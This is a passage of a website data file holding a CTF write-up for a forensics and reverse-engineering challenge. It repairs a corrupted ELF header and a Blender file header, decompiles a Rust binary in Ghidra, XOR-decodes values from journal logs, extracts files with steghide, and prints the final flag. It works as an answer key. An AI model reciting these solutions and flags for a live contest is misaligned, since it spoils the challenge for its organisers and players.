headers:         14\r\n  Size of section headers:           64 (bytes)\r\n  Number of section headers:         32\r\n  Section header string table index: 31\r\n```\r\n\r\nThe suspicious field here is **“Start of program headers: 0 (bytes into file)”**. In a valid ELF64 binary, the program header table never begins at offset 0 because offset 0 contains the ELF header itself. Typically, the program headers are placed immediately after the ELF header, at offset **64 bytes** (`0x40`). The program header table (`e_phoff`) tells the OS loader where to find the list of segments to map into memory-such as the code segment, data segment, and dynamic linker information.\r\n\r\nWhen `e_phoff` is incorrectly set to `0`, the loader misinterprets the ELF header as the first program header. Since the ELF header bytes don’t represent valid segment definitions, the loader reads nonsensical values for file offsets, virtual addresses, and permissions. As a result, during the loading process, it attempts to create invalid memory mappings, which immediately triggers a **page fault**. This leads to an **instant segmentation fault** before the program’s `main()` function or any initialization code runs. Because the crash occurs inside the kernel’s loading routine, traditional debuggers like `gdb` can’t attach in time to catch the fault, leaving the binary apparently “undebuggable.”\r\n\r\nSince the loader depends entirely on the program headers to set up the memory space, repairing this field is necessary before further analysis or execution. The fix involves correcting the **Program Header Table offset** (`e_phoff`) in the ELF header. For ELF64 files, this value resides at byte offset `0x20` within the file. Using a hex editor, you can navigate to that position and replace the eight bytes representing `0x0000000000000000` with `0x0000000000000040` (the little-endian encoding of decimal 64).\r\n\r\nNext step would be to write a solve script for the binary to patch the magic headers \r\n```python\r\nimport sys\r\nimport os\r\nimport struct\r\n\r\ndef repair_elf_header(filepath):\r\n    \"\"\"\r\n    Repairs the e_phoff field in a corrupted ELF header.\r\n    \"\"\"\r\n    # The e_phoff field is at offset 0x20 (32) in a 64-bit ELF file.\r\n    E_PHOFF_OFFSET = 0x20\r\n    \r\n    # The correct value is 64, since the program headers start\r\n    # right after the 64-byte ELF header.\r\n    CORRECT_VALUE = 64\r\n\r\n    try:\r\n        with open(filepath, \"r+b\") as f:\r\n            # Go to the location of e_phoff\r\n            f.seek(E_PHOFF_OFFSET)\r\n            \r\n            # Write the correct 64-bit integer value (64) in little-endian format\r\n            f.write(struct.pack('\u003CQ', CORRECT_VALUE))\r\n            \r\n            print(f\"[+] Successfully patched '{filepath}'.\")\r\n            print(f\"[*] Wrote value {CORRECT_VALUE} to offset {hex(E_PHOFF_OFFSET)}.\")\r\n\r\n    except Exception as e:\r\n        print(f\"[!] An error occurred: {e}\")\r\n\r\ndef main():\r\n    if len(sys.argv) != 2:\r\n        print(f\"Usage: python {sys.argv[0]} \u003Cpath_to_mangled_binary>\")\r\n        sys.exit(1)\r\n        \r\n    filepath = sys.argv[1]\r\n    if not os.path.exists(filepath):\r\n        print(f\"[!] File not found: {filepath}\")\r\n        sys.exit(1)\r\n\r\n    repair_elf_header(filepath)\r\n\r\nif __name__ == \"__main__\":\r\n    main()\r\n```\r\nRunning readelf again gives us \r\n```bash\r\n                                                                      21:12:47\r\nELF Header:\r\n  Magic:   7f 45 4c 46 02 01 01 00 00 00 00 00 00 00 00 00 \r\n  Class:                             ELF64\r\n  Data:                              2's complement, little endian\r\n  Version:                           1 (current)\r\n  OS/ABI:                            UNIX - System V\r\n  ABI Version:                       0\r\n  Type:                              DYN (Position-Independent Executable file)\r\n  Machine:                           Advanced Micro Devices X86-64\r\n  Version:                           0x1\r\n  Entry point address:               0xf250\r\n  Start of program headers:          64 (bytes into file)\r\n  Start of section headers:          523080 (bytes into file)\r\n  Flags:                             0x0\r\n  Size of this header:               64 (bytes)\r\n  Size of program headers:           56 (bytes)\r\n  Number of program headers:         14\r\n  Size of section headers:           64 (bytes)\r\n  Number of section headers:         32\r\n  Section header string table index: 31\r\n```\r\n\r\n\r\nNow we can start running the binary again , to see it's true behaviour \r\n\r\n```\r\n./rust_vm_poc                                                                               \r\nExecution finished.\r\n```\r\n\r\nGhidra provides a powerful static analysis environment that makes reverse engineering faster and less error prone. Its decompiler translates assembly into readable C-like pseudocode, which greatly speeds up understanding control flow and data manipulation compared to reading raw disassembly. To make reverse engineering even easier for Rust binaries, the GhidRust plugin can be integrated. GhidRust [GhidRust GitHub repository](https://github.com/DMaroo/GhidRust) is designed specifically for Rust-compiled executables: it can identify Rust binaries, apply function signatures from the Rust standard library to stripped binaries, and assist in decompilation by emitting more readable pseudocode that resembles Rust code\r\n\r\n\r\n\r\n![Ghidra entry function analysis](/images/posts/havok-engine-reverse-engineering/image-12.png)\r\n\r\n\r\nIn the entry function we can see that \r\n\r\n```bash\r\n    0010f26f ff 15 2b        CALL       qword ptr [->\u003CEXTERNAL>::__libc_start_main]      undefined __libc_start_main()\r\n                 fd 06 00                                                                    = 001802d8\r\n```\r\n\r\nSo this instruction is the usual way position independent executables call external library functions: the call goes through a GOT entry so the dynamic loader can patch it to the real address.\r\n\r\nAlso we see a main : ) So thats something , all the functions from the symbol table have been stripped so we manually have to trace back each call ' \r\n\r\nLets take a look at main \r\n\r\n```c\r\n\r\n/* WARNING: Type propagation algorithm not settling */\r\n/* WARNING: Globals starting with '_' overlap smaller symbols at the same address */\r\n\r\nundefined8 FUN_001125b0(undefined8 param_1,undefined8 param_2)\r\n\r\n{\r\n  uint uVar1;\r\n  void *pvVar2;\r\n  int *piVar3;\r\n  long lVar4;\r\n  int iVar5;\r\n  pollfd *ppVar6;\r\n  __sighandler_t p_Var7;\r\n  ulong uVar8;\r\n  pthread_t __th;\r\n  long lVar9;\r\n  undefined4 *puVar10;\r\n  long lVar11;\r\n  int *piVar12;\r\n  int *piVar13;\r\n  undefined8 uVar14;\r\n  ulong uVar15;\r\n  undefined **ppuVar16;\r\n  int *piVar17;\r\n  pollfd *__fds;\r\n  code *pcVar18;\r\n  long in_FS_OFFSET;\r\n  bool bVar19;\r\n  int local_118;\r\n  int local_114;\r\n  void *local_110;\r\n  pthread_attr_t local_108;\r\n  ulong uStack_d0;\r\n  ulong local_c8;\r\n  ulong uStack_c0;\r\n  ulong local_b8;\r\n  ulong uStack_b0;\r\n  ulong local_a8;\r\n  ulong uStack_a0;\r\n  ulong local_98;\r\n  ulong uStack_90;\r\n  ulong local_88;\r\n  undefined8 uStack_80;\r\n  _func_5327 *local_78;\r\n  size_t local_68;\r\n  undefined8 local_60 [6];\r\n  \r\n  piVar17 = &local_118;\r\n  local_108.__align._0_4_ = 0;\r\n  local_108.__align._4_2_ = 0;\r\n  local_108.__align._6_2_ = 0;\r\n  local_108._8_8_ = 1;\r\n  local_108._16_8_ = 2;\r\n  __fds = (pollfd *)&local_108;\r\n  pcVar18 = poll;\r\n  do {\r\n    iVar5 = poll(__fds,3,0);\r\n    if (iVar5 != -1) {\r\n      if ((((local_108.__align & 0x20000000000000U) != 0) &&\r\n          (iVar5 = open64(\"/dev/null\",2,0), iVar5 == -1)) ||\r\n         (((local_108._8_8_ & 0x20000000000000) != 0 &&\r\n          (iVar5 = open64(\"/dev/null\",2,0), iVar5 == -1)))) goto LAB_00112b18;\r\n      ppVar6 = __fds;\r\n      if ((local_108._16_8_ & 0x20000000000000) != 0) goto LAB_00112711;\r\n      goto LAB_00112730;\r\n    }\r\n    ppVar6 = (pollfd *)__errno_location();\r\n    uVar1 = ppVar6->fd;\r\n  } while (uVar1 == 4);\r\n  if ((((0x16 \u003C uVar1) || ((0x401800U >> (uVar1 & 0x1f) & 1) == 0)) ||\r\n      ((iVar5 = fcntl(0,1), iVar5 == -1 &&\r\n       ((ppVar6->fd == 9 && (iVar5 = open64(\"/dev/null\",2,0), iVar5 == -1)))))) ||\r\n     ((iVar5 = fcntl(1,1), iVar5 == -1 &&\r\n      ((ppVar6->fd == 9 && (iVar5 = open64(\"/dev/null\",2,0), iVar5 == -1)))))) {\r\nLAB_00112b18:\r\n                    /* WARNING: Subroutine does not return */\r\n    abort();\r\n  }\r\n  iVar5 = fcntl(2,1);\r\n  if ((iVar5 == -1) && (__fds = ppVar6, ppVar6->fd == 9)) {\r\nLAB_00112711:\r\n    iVar5 = open64(\"/dev/null\",2,0);\r\n    ppVar6 = __fds;\r\n    if (iVar5 == -1) goto LAB_00112b18;\r\n  }\r\nLAB_00112730:\r\n  p_Var7 = signal(0xd,(__sighandler_t)&DAT_00000001);\r\n  if (p_Var7 == (__sighandler_t)0xffffffffffffffff) {\r\n    local_108.__align = (long)&PTR_DAT_0017e2f0;\r\n    local_108._8_8_ = 1;\r\n    local_108._16_8_ = 8;\r\n    local_108._24_8_ = 0;\r\n    local_108._32_8_ = 0;\r\n    uVar14 = FUN_00136cf0(local_60,&local_108);\r\n    FUN_00133cc0(uVar14);\r\n    FUN_0010e5a0();\r\nLAB_00112aa3:\r\n    local_60[0] = CONCAT71(local_60[0]._1_7_,1);\r\n    local_108.__align = (long)local_60;\r\n    FUN_0010df40(&DAT_0017fa08,0,&local_108,&DAT_0017d4e0,&PTR_s_library/std/src/rt.rs_0017d4b8);\r\nLAB_00112a10:\r\n    piVar12 = __errno_location();\r\n    piVar13 = (int *)0x0;\r\n    LOCK();\r\n    bVar19 = DAT_0017fad8 == (int *)0x0;\r\n    piVar3 = piVar12;\r\n    if (!bVar19) {\r\n      piVar13 = DAT_0017fad8;\r\n      piVar3 = DAT_0017fad8;\r\n    }\r\n    DAT_0017fad8 = piVar3;\r\n    UNLOCK();\r\n    if (bVar19) {\r\n      return 0;\r\n    }\r\n    if (piVar13 != piVar12) {\r\n      do {\r\n        pause();\r\n      } while( true );\r\n    }\r\n    FUN_00107710(\"std::process::exit called re-entrantly\");\r\nLAB_00112aea:\r\n    ppuVar16 = &PTR_s_library/std/src/sys/pal/unix/sta_0017e150;\r\n  }\r\n  else {\r\n    uVar8 = sysconf(0x1e);\r\n    local_108._32_8_ = 0;\r\n    local_108._40_8_ = 0;\r\n    local_108._16_8_ = 0;\r\n    local_108._24_8_ = 0;\r\n    local_108.__align._0_4_ = 0;\r\n    local_108.__align._4_2_ = 0;\r\n    local_108.__align._6_2_ = 0;\r\n    local_108._8_8_ = 0;\r\n    local_108._48_8_ = 0;\r\n    DAT_0017faf0 = uVar8;\r\n    __th = pthread_self();\r\n    iVar5 = pthread_getattr_np(__th,&local_108);\r\n    bVar19 = iVar5 == 0;\r\n    if (!bVar19) {\r\nLAB_00112832:\r\n      local_88 = 0;\r\n      uStack_80._0_4_ = 0;\r\n      uStack_80._4_4_ = 0;\r\n      local_98 = 0;\r\n      uStack_90 = 0;\r\n      local_a8 = 0;\r\n      uStack_a0 = 0;\r\n      local_b8 = 0;\r\n      uStack_b0 = 0;\r\n      local_c8 = 0;\r\n      uStack_c0 = 0;\r\n      local_108._48_8_ = 0;\r\n      uStack_d0 = 0;\r\n      local_108._32_8_ = 0;\r\n      local_108._40_8_ = 0;\r\n      local_108._16_8_ = 0;\r\n      local_108._24_8_ = 0;\r\n      local_108.__align._0_4_ = 0;\r\n      local_108.__align._4_2_ = 0;\r\n      local_108.__align._6_2_ = 0;\r\n      local_108._8_8_ = 0;\r\n      local_78 = (_func_5327 *)0x0;\r\n      sigaction(0xb,(sigaction *)0x0,(sigaction *)&local_108);\r\n      if ((pollfd)local_108.__align == (pollfd)0x0) {\r\n        if (DAT_0017fb00 == '\\0') {\r\n          DAT_0017fb00 = '\\x01';\r\n                    /* try { // try from 001128a0 to 00112986 has its CatchHandler @ 00112b44 */\r\n          DAT_0017faf8 = FUN_0014f930();\r\n          if (iVar5 == 0) {\r\n            puVar10 = (undefined4 *)malloc(4);\r\n            if (puVar10 == (undefined4 *)0x0) goto LAB_00112b2c;\r\n            *puVar10 = 0x6e69616d;\r\n            FUN_00134b20(pcVar18,ppVar6,puVar10);\r\n          }\r\n          bVar19 = false;\r\n        }\r\n        uStack_80._0_4_ = 0x8000004;\r\n        local_108.__align = (long)FUN_0014fb00;\r\n        sigaction(0xb,(sigaction *)&local_108,(sigaction *)0x0);\r\n      }\r\n      sigaction(7,(sigaction *)0x0,(sigaction *)&local_108);\r\n      if ((pollfd)local_108.__align == (pollfd)0x0) {\r\n        if (DAT_0017fb00 == '\\0') {\r\n          DAT_0017fb00 = '\\x01';\r\n          DAT_0017faf8 = FUN_0014f930();\r\n          if (bVar19) {\r\n            puVar10 = (undefined4 *)malloc(4);\r\n            if (puVar10 == (undefined4 *)0x0) {\r\nLAB_00112b2c:\r\n                    /* WARNING: Subroutine does not return */\r\n              FUN_00107193(1,4,&PTR_s_/build/rustc-1.89.0-src/library/_0017df00);\r\n            }\r\n            *puVar10 = 0x6e69616d;\r\n            FUN_00134b20(pcVar18,ppVar6,puVar10);\r\n          }\r\n        }\r\n        uStack_80._0_4_ = 0x8000004;\r\n        local_108.__align = (long)FUN_0014fb00;\r\n        sigaction(7,(sigaction *)&local_108,(sigaction *)0x0);\r\n        lVar9 = *(long *)(in_FS_OFFSET + -8);\r\n        lVar11 = DAT_0017fb08;\r\n      }\r\n      else {\r\n        lVar9 = *(long *)(in_FS_OFFSET + -8);\r\n        lVar11 = DAT_0017fb08;\r\n      }\r\n      _DAT_0017fa58 = param_2;\r\n      DAT_0017fb08 = lVar11;\r\n      if (lVar9 == 0) {\r\n        do {\r\n          if (lVar11 == -1) {\r\n                    /* try { // try from 00112a54 to 00112b41 has its CatchHandler @ 00112b44 */\r\n            FUN_0010e5c0();\r\n            goto LAB_00112b42;\r\n          }\r\n          lVar9 = lVar11 + 1;\r\n          LOCK();\r\n          bVar19 = lVar11 != DAT_0017fb08;\r\n          lVar4 = lVar9;\r\n          if (bVar19) {\r\n            lVar11 = DAT_0017fb08;\r\n            lVar4 = DAT_0017fb08;\r\n          }\r\n          DAT_0017fb08 = lVar4;\r\n          UNLOCK();\r\n        } while (bVar19);\r\n        *(long *)(in_FS_OFFSET + -8) = lVar9;\r\n      }\r\n      DAT_0017fac0 = lVar9;\r\n      FUN_0010f340(FUN_0010fec0);\r\n      if (DAT_0017fa08 != 3) goto LAB_00112aa3;\r\n      goto LAB_00112a10;\r\n    }\r\n    local_110 = (void *)0x0;\r\n    local_68 = 0;\r\n    local_118 = pthread_attr_getstack(&local_108,&local_110,&local_68);\r\n    pvVar2 = local_110;\r\n    if (local_118 != 0) goto LAB_00112aea;\r\n    local_114 = pthread_attr_destroy(&local_108);\r\n    if (local_114 == 0) {\r\n      if (uVar8 == 0) {\r\n        FUN_001079d0(&PTR_s_library/std/src/sys/pal/unix/sta_0017e168);\r\n        goto LAB_00112b42;\r\n      }\r\n      if (((ulong)pvVar2 | uVar8) >> 0x20 == 0) {\r\n        uVar15 = ((ulong)pvVar2 & 0xffffffff) % (uVar8 & 0xffffffff);\r\n      }\r\n      else {\r\n        uVar15 = (ulong)pvVar2 % uVar8;\r\n      }\r\n      lVar9 = uVar8 - uVar15;\r\n      if (uVar15 == 0) {\r\n        lVar9 = 0;\r\n      }\r\n      ppVar6 = (pollfd *)((long)pvVar2 + lVar9);\r\n      pcVar18 = (code *)((long)ppVar6 - uVar8);\r\n      goto LAB_00112832;\r\n    }\r\n    ppuVar16 = &PTR_s_library/std/src/sys/pal/unix/sta_0017e138;\r\n    piVar17 = &local_114;\r\n  }\r\n  local_60[0] = 0;\r\n  FUN_0010e47f(piVar17,local_60,ppuVar16);\r\nLAB_00112b42:\r\n                    /* WARNING: Does not return */\r\n  pcVar18 = (code *)invalidInstructionException();\r\n  (*pcVar18)();\r\n}\r\n\r\n```\r\nThis decompiled function is the program startup/initializer, not the user main. The pseudocode shows classic runtime and platform setup: it calls poll/fcntl/open64 to check/initialize file descriptors, installs signal handlers (sigaction / signal), calls sysconf and pthread_getattr_np to query thread and stack info, initializes libc/Rust runtime structures, sets up thread-local data, and invokes runtime callbacks (functions like FUN_0010f340, FUN_0010fec0, FUN_0010e5c0, etc.). The many DAT_00... globals are runtime state and library pointers (e.g., pointers to Rust std internals). Warnings like Type propagation algorithm not settling and the undefined8 return type are Ghidra’s decompiler telling you it could not precisely infer high-level types common in compiler-optimized startup code : ( \r\n\r\n\r\nAnother useful step in reverse engineering, especially when the decompiled code looks noisy or unclear, is to inspect the strings embedded in the binary. Strings often reveal crucial hints about program logic, such as messages printed to the console, function names, file paths, or even the flag format\r\n\r\nLooking at the strings we see a hint to the flag \r\n\r\n\r\n![Strings analysis showing flag hint](/images/posts/havok-engine-reverse-engineering/image-13.png)\r\n\r\n\r\n\r\n\r\n\r\nLets  move onto the looking at the flag functions .\r\n\r\n\r\nWe see a function that has something called flag_generator and in the huge dissass we see PTR_s_Execution_finished._0017baf8 . So this might be the main logic handling of the binary . \r\n\r\n![Flag generator function](/images/posts/havok-engine-reverse-engineering/image-14.png)\r\n\r\nALsooo investigating the huge dump we find , a function call to FUN_00113590 included a long embedded string containing a complete Python script. The script defines a function named generate_flag_part(seed), which takes an integer seed, converts it to bytes, computes its SHA-256 hash, and returns the first eight hexadecimal characters of the resulting digest. This pattern suggests that the binary relies on Python code execution to dynamically produce a portion of the final flag\r\n\r\n```c\r\n  FUN_00113590(&local_248,\r\n               \"\\nimport base64\\nimport hashlib\\n\\ndef generate_flag_part(seed: int) -> str:\\n \\n   \\n    seed_bytes = str(seed).encode(\\'utf-8\\')\\n    hashed_seed = hashlib.sha256(seed _bytes).hexdigest()\\n    \\n   \\n    flag_part = hashed_seed[:8]\\n    \\n    \\n    retu rn flag_part\"\r\n               ,0xfa);\r\n```\r\nInvestigating more through this huge rust dump we get , \r\n\r\n```asm\r\n\r\n                             s_[iptables-audit]_DENY-EVENT-DATA_0016d000     XREF[1]:     0017bad8(*)  \r\n        0016d000 5b 69 70        ds         \"[iptables-audit] DENY-EVENT-DATA: \"\r\n                 74 61 62 \r\n                 6c 65 73 \r\n                             s_[iptables-audit]_DENY-EVENT-KEY:_0016d022     XREF[1]:     0017bae8(*)  \r\n        0016d022 5b 69 70        ds         \"[iptables-audit] DENY-EVENT-KEY: \"\r\n                 74 61 62 \r\n                 6c 65 73 \r\n                             s_rust_vm_poc_0016d043                          XREF[6]:     FUN_0010fec0:00111b3e(*), \r\n                                                                                          FUN_0010fec0:00111b45(*), \r\n                                                                                          FUN_0010fec0:00111b8e(*), \r\n                                                                                          FUN_0010fec0:00111c24(*), \r\n                                                                                          FUN_0010fec0:00111c2b(*), \r\n                                                                                          FUN_0010fec0:00111c74(*)  \r\n        0016d043 72 75 73        ds         \"rust_vm_poc\"\r\n                 74 5f 76 \r\n                 6d 5f 70 \r\n                             s_Execution_finished._0016d04e                  XREF[1]:     0017baf8(*)  \r\n        0016d04e 45 78 65        ds         \"Execution finished.\\n\"\r\n                 63 75 74 \r\n                 69 6f 6e \r\n```\r\n\r\n![iptables-audit strings](/images/posts/havok-engine-reverse-engineering/image-15.png)\r\n\r\nThe \"[iptables-audit] DENY-EVENT-DATA: \" string is part of a static message table that FUN_0010fec0 uses to log results. Because the same codebase embeds a Python snippet that computes generate_flag_part(seed) and also contains the \"Execution finished.\" message, the evidence indicates the program executes the Python/VM code and then logs its output using these prefixes. By tracing references from the pointer table into FUN_0010fec0 and inspecting the buffer written by the Python runner (the &local_248 passed to FUN_00113590), we can capture the generated segments and reconstruct the full flag also :) it provides the keyword, iptables-audit, needed to find the messages. Second, the presence of separate DATA and KEY fields is a massive hint that the flag is encrypted \r\n\r\n\r\n\r\n\r\nLets turn to analysing the system logs now  . \r\n\r\njournalctl is a command-line utility used on Linux systems that use systemd. It reads and displays logs that are collected by the systemd journal, which is the central logging system for systemd-managed systems.\r\n\r\nUnlike traditional text logs (/var/log/syslog, /var/log/messages), the journal stores logs in a binary format, allowing structured queries, filtering, and metadata access. It includes not only messages from the kernel and services, but also stdout/stderr of systemd services\r\n\r\n\r\n![journalctl output](/images/posts/havok-engine-reverse-engineering/image-16.png)\r\n\r\n\r\n```python\r\nimport base64\r\nimport binascii\r\n\r\n\r\nencrypted_data_hex = \"722e7e207155\"\r\nkey_hex = \"aff543c352c2\"\r\n\r\n# Decode, XOR, and Base64-encode\r\nencrypted_data = binascii.unhexlify(encrypted_data_hex)\r\nkey = binascii.unhexlify(key_hex)\r\ndecrypted_data = bytes([d ^ k for d, k in zip(encrypted_data, key)])\r\nflag = base64.b64encode(decrypted_data)\r\n\r\nprint(f\"Flag: {flag.decode('utf-8')}\")\r\n```\r\n\r\n###  Flag: 3ds94yOX \r\n\r\n\r\n\r\n# PART-3\r\n\r\n\r\n## Step 1: Inspect the Hint File\r\n\r\nThe first file to examine is `hi.pskx`. Using basic tools like `strings` or `grep`, unusual sequences can be found. Searching for Base64-like strings reveals a hidden message:\r\n\r\n```bash\r\ngrep -a -oE '[A-Za-z0-9+/=]{12,}' hi.pskx | head -n1 | base64 -d\r\n```\r\n\r\nDecoded, this produces:\r\n\r\n```\r\nBones align not for anatomy\r\n```\r\n\r\nThis isn’t the final answer. Instead, it guides you to **look at bones or root nodes** in the Blender file to ultimately derive the archive password.\r\n\r\n---\r\n\r\n## Step 2: Repair the Blender File Header (First 8 Bytes)\r\n\r\nThe corrupted Blender or `.pskx` file cannot open because the **first 8 bytes** are broken, which contain the **magic number and version**. Players must repair this to continue.\r\n\r\n**Solution:**\r\n\r\n1. Backup the broken file:\r\n\r\n```bash\r\ncp broken.blend broken.blend.bak\r\n```\r\n\r\n2. Obtain a reference file (`ref.blend`) from the same Blender version or exporter.\r\n\r\n3. Replace only the first 8 bytes using a hex editor or command-line tool:\r\n\r\n```bash\r\n# Replace the first 8 bytes\r\ndd if=ref.blend of=broken.blend bs=1 count=8 conv=notrunc\r\n```\r\n\r\n* `bs=1 count=8` → only the first 8 bytes are replaced\r\n* `conv=notrunc` → keeps the rest of the file intact\r\n\r\n4. Verify the file opens in Blender. The rest of the file remains untouched, allowing you to continue.\r\n\r\n> Fixing the first 8 bytes restores the file’s magic number and version, enabling inspection of root nodes to derive the next clue.\r\n\r\n---\r\n\r\n## Step 3: Extract Root Node Values\r\n\r\nOnce the Blender file opens, examine **root nodes or bones**, which contain numeric values forming the zip password. This can be done inside Blender or with a headless Python snippet:\r\n\r\n```bash\r\nblender --background repaired.blend --python-expr \"\r\nimport bpy, json\r\nobjs={}\r\nfor o in bpy.data.objects:\r\n  props={}\r\n  try:\r\n    for k in o.keys():\r\n      if k!='_RNA_UI': props[k]=o[k]\r\n  except Exception:\r\n    pass\r\n  if props: objs[o.name]=props\r\nprint(json.dumps(objs))\r\n\"\r\n```\r\n\r\nInspect the output for root node values. These numbers are combined to form the **zip password**, e.g., `498`.\r\n\r\n\r\n![Blender root node values](/images/posts/havok-engine-reverse-engineering/image-16.png)\r\n\r\n---\r\n\r\n## Step 4: Unlock the Encrypted Archive\r\n\r\nUse the password obtained from the root nodes to extract the hidden stego image from the archive:\r\n\r\n```bash\r\n7z x challenge.7z -p498\r\n```\r\n\r\n**Output:**\r\n```\r\nEverything is Ok\r\nSize:       5855446\r\nCompressed: 5693434\r\n```\r\n\r\nWe now have `lunee.jpg`.\r\n\r\n### Step 2: Analyze lunee.jpg\r\n\r\nLet's check if there's anything hidden in this image using steghide:\r\n\r\n```bash\r\nsteghide info lunee.jpg\r\n```\r\n\r\n**Output:**\r\n```\r\n\"lunee.jpg\":\r\n  format: jpeg\r\n  capacity: 346.5 KB\r\nTry to get information about embedded data ? (y/n) y\r\nEnter passphrase:\r\n  embedded file \"s3cret.jpg\":\r\n    size: 64.5 KB\r\n    encrypted: rijndael-128, cbc\r\n    compressed: yes\r\n```\r\n\r\nPerfect! There's another file hidden inside. Let's extract it:\r\n\r\n```bash\r\nsteghide extract -sf lunee.jpg\r\n```\r\n\r\nPress Enter when prompted for the passphrase (no password needed).\r\n\r\n**Output:**\r\n```\r\nwrote extracted data to \"s3cret.jpg\".\r\n```\r\n\r\n### Step 3: Extract from s3cret.jpg\r\n\r\nNow we have another image. Let's check if this one also contains hidden data:\r\n\r\n```bash\r\nsteghide info s3cret.jpg\r\n```\r\n\r\nIt does! Let's extract it:\r\n\r\n```bash\r\nsteghide extract -sf s3cret.jpg\r\n```\r\n\r\nAgain, press Enter for no password.\r\n\r\n**Output:**\r\n```\r\nwrote extracted data to \"flag.txt\".\r\n```\r\n\r\n### Step 4: Get the Flag\r\n\r\n```bash\r\ncat flag.txt\r\n```\r\n\r\n**Flag:** `Cl41r3_3xp3d33  4sh3n_B0n3s33`\r\n\r\n## Solution Summary\r\n\r\n```bash\r\n# Full solution one-liner\r\n7z x challenge.7z -p498 && \\\r\nsteghide extract -sf lunee.jpg -p \"\" && \\\r\nsteghide extract -sf s3cret.jpg -p \"\" && \\\r\ncat flag.txt\r\n```\r\n```\r\n```\r\npart 1 \r\n```c275036.89749.549105.207``` \r\n\r\npart2 \r\n```3ds94yOX```\r\n\r\npart3\r\n```Cl41r3_3xp3d33  4sh3n_B0n3s33```\r\n```\r\nThe flag format is :\r\n\r\nctf{PART1_PART2_PART3}kernel\r\n```\r\n\r\n## **FLAG - ctf{c275036.89749.549105.207_3ds94yOX_Cl41r3_3xp3d334sh3n_B0n3s33}kernel**","src/content/blog/havok-engine-reverse-engineering.md","72d3f711966c41ae",{"html":636,"metadata":637},"\u003Cp>\u003Cimg src=\"/images/posts/havok-engine-reverse-engineering/header.png\" alt=\"Challenge Header\">\u003C/p>\n\u003Cp>\u003Cstrong>Category:\u003C/strong> Forensics / Reverse Engineering\u003Cbr>\n\u003Cstrong>Difficulty:\u003C/strong> Hard\u003Cbr>\n\u003Cstrong>Points:\u003C/strong> 500\u003Cbr>\n\u003Cstrong>Author:\u003C/strong> muffin\u003C/p>\n\u003Cp>\u003Cstrong>Download:\u003C/strong> \u003Ca href=\"https://drive.google.com/file/d/1et9zmI8x2CGYnwP1DhD0sfCOJWerGwfV/view?usp=drive_link\">Challenge Files\u003C/a>\u003C/p>\n\u003Chr>\n\u003Ch2 id=\"description\">Description\u003C/h2>\n\u003Cp>She is not of Lordran’s timelines, nor any world scholars recall.\r\nAn unbound Firekeeper  caught between files that refuse to load and geometry that rejects her shape,\r\nas if she were written into existence and erased in the same breath.\u003C/p>\n\u003Cp>Only fragments of her remain, scattered through the wreckage of an unfinished realm:\u003C/p>\n\u003Cp>Those who examined the fragments recall a single whisper threaded through all anomalies:\u003C/p>\n\u003Cp>\u003Cstrong>“To restore her, trace the fragments.\r\nAll three converge where the last bonfire never burned.”\u003C/strong>\u003C/p>\n\u003Ch2 id=\"ashen-shard\">\u003Cstrong>Ashen Shard\u003C/strong>\u003C/h2>\n\u003Cp>A brittle sliver from a world that failed to load.\r\nA silhouette flickers within it, suspended between one form and the next.\r\nIt remembers where she once stood, though the world does not.\u003C/p>\n\u003Ch2 id=\"cinder-of-the-rogue-machine\">\u003Cstrong>Cinder of the Rogue Machine\u003C/strong>\u003C/h2>\n\u003Cp>A smoldering ember taken from a dormant construct.\r\nIt mutters in recursive tones, as if trying to recall a name long lost.\r\nIt burns not with flame, but with computation.\u003C/p>\n\u003Ch2 id=\"bone-of-the-lost-reflection\">\u003Cstrong>Bone of the Lost Reflection\u003C/strong>\u003C/h2>\n\u003Cp>A pale remnant from a body that never fully resolved.\r\nIts surface trembles with faint afterimages of a kneeling figure.\r\nSome say it holds her final memory.\u003C/p>\n\u003Ch2 id=\"objective\">\u003Cstrong>Objective\u003C/strong>\u003C/h2>\n\u003Cp>Recover the three fragments hidden across the provided materials.\r\nReconstruct the forgotten path of the unbound Firekeeper.\r\nAssemble the final key where a bonfire should have been, but never was.\u003C/p>\n\u003Ch1 id=\"solution\">\u003Cstrong>Solution\u003C/strong>\u003C/h1>\n\u003Ch1 id=\"part-1\">PART-1\u003C/h1>\n\u003Cp>\u003Cstrong>Challenge:\u003C/strong> We are given a Havoc Engine dump file.\r\n\u003Cstrong>Objective:\u003C/strong> Locate the Firekeeper.\u003C/p>\n\u003Ch2 id=\"initial-analysis\">Initial Analysis\u003C/h2>\n\u003Cp>We are provided with a large set of files from the game dump. To start, it’s crucial to understand and reverse-engineer the \u003Cstrong>Havoc Engine\u003C/strong> and how it loads the game’s proprietary formats.\u003C/p>\n\u003Cp>FromSoftware uses custom, proprietary files for game data. As a result, traditional tools may not work directly, and you’ll often need your own utilities to parse or modify these files.\u003C/p>\n\u003Cp>\u003Cstrong>Notes:\u003C/strong>\u003C/p>\n\u003Cul>\n\u003Cli>Tutorials for \u003Cstrong>Dark Souls Map Studio\u003C/strong> generally apply to \u003Cstrong>Smithbox\u003C/strong>, although some UI elements and workflows have changed.\u003C/li>\n\u003Cli>Older tutorials use \u003Cstrong>Yabber\u003C/strong>, which is now outdated and may cause problems. Instead, you should use \u003Ca href=\"https://github.com/ividyon/WitchyBND/releases\">\u003Cstrong>WitchyBND\u003C/strong>\u003C/a>, which works similarly for most users.\u003C/li>\n\u003C/ul>\n\u003Ch2 id=\"modding-considerations\">Modding Considerations\u003C/h2>\n\u003Cp>It’s important to note that \u003Cstrong>FromSoftware games were never designed to be modded\u003C/strong>.\u003C/p>\n\u003Cp>There are primarily two types of mods that can be loaded via mod loaders: \u003Cstrong>DLL mods\u003C/strong> and \u003Cstrong>file replacement mods\u003C/strong>.\u003C/p>\n\u003Ch3 id=\"dll-mods\">DLL Mods\u003C/h3>\n\u003Cul>\n\u003Cli>\n\u003Cp>Contain primarily a \u003Ccode>.dll\u003C/code> file.\u003C/p>\n\u003C/li>\n\u003Cli>\n\u003Cp>May also include configuration files (\u003Ccode>.ini\u003C/code>) or other required resources.\u003C/p>\n\u003C/li>\n\u003Cli>\n\u003Cp>Modify game memory directly, enabling effects that file replacement mods cannot achieve.\u003C/p>\n\u003C/li>\n\u003Cli>\n\u003Cp>Example: \u003Cstrong>Seamless Co-op\u003C/strong>.\u003C/p>\n\u003Cul>\n\u003Cli>Although it has its own folder and launcher, it can still be loaded via mod loaders alongside other mods.\u003C/li>\n\u003C/ul>\n\u003C/li>\n\u003C/ul>\n\u003Ch3 id=\"file-replacement-mods\">File Replacement Mods\u003C/h3>\n\u003Cul>\n\u003Cli>\n\u003Cp>Consist of modified versions of the game’s internal files.\u003C/p>\n\u003C/li>\n\u003Cli>\n\u003Cp>Common files and folders 